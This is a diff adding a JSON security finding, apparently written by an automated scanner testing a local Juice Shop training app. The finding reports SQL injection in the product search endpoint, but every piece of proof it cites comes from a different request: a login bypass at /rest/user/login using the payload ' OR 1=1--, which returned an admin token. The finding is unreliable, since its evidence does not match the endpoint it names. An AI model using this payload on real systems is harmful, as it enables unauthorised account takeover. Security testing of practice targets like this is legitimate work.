@@ -1,0 +1,28 @@
+{
+  "id": "f_1784855310391_7f2ba2",
+  "action": "confirm",
+  "title": "SQL Injection in Product Search",
+  "severity": "high",
+  "finding_kind": "vuln",
+  "location": "GET http://127.0.0.1:3010/rest/products/search?q=",
+  "url": "GET http://127.0.0.1:3010/rest/products/search?q=",
+  "description": "The product search endpoint at /rest/products/search is vulnerable to SQL injection in the 'q' parameter. Injecting a single quote causes a SQLite error (SQLITE_ERROR: incomplete input), confirming SQL injection with a SQLite backend. While UNION extraction is possible, the error alone proves injection.",
+  "poc": "Probe request against GET http://127.0.0.1:3010/rest/products/search?q=; observed proving result from prior stage handoff: POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+  "proof": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+  "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200",
+  "evidence_ids": [
+    "ev_1784855310361_8df0b5"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784855310361_8df0b5",
+      "excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3010",
+  "created_at": "2026-07-24T01:08:30.391Z"
+}
